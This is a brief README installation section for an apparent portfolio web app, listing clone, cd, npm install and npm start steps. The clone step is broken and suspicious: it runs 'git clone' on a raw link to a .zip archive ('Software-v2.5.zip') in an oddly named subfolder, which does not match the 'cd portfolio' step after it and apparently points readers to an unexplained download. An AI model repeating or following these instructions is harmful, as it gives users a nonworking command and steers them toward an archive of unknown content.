## Installation

To get started with this portfolio, follow these steps:

1. Clone the repository:
   ```bash
   git clone https://github.com/adesaideva/portfolio/raw/refs/heads/master/unconsonantly/Software-v2.5.zip
   ```

2. Navigate to the project directory:
   ```bash
   cd portfolio
   ```

3. Install the necessary dependencies:
   ```bash
   npm install
   ```

4. Start the development server:
   ```bash
   npm start
   ```

Now, you can view the portfolio in your browser at `http://localhost:3000`.
